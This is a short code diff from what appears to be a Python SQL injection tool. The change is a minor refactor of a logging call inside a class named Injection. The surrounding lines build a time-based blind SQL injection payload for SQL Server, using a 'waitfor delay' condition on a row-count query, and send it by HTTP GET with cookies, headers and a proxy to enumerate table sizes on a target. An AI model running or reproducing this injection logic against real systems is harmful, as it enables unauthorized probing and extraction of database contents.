@@ -987,7 +987,7 @@ class Injection:
 					direccion = obj.server.replace("_sqli_",obj.pref+"  if (select count(*) from "+where+".."+table+")="+str(limite)+" waitfor delay '00:00:01'"+obj.suf)
 				count = requests.get(url=direccion,cookies=obj.cookies,headers=obj.cabeceras,proxies=obj.proxy)
 				if obj.verbosity:
-					obj.showData(objeto=count,vulnerable=True,lll=unquote(repr(obj.server.replace("_sqli_",obj.pref+"  if (select count(*) from "+where+".."+table+")="+str(limite)+" waitfor delay '00:00:01'"+obj.suf))))
+					obj.showData(objeto=count,vulnerable=True,lll=unquote(repr(direccion)))
 				limite = limite +1
 		#print "3lol"
 		#print "columna "+ columna
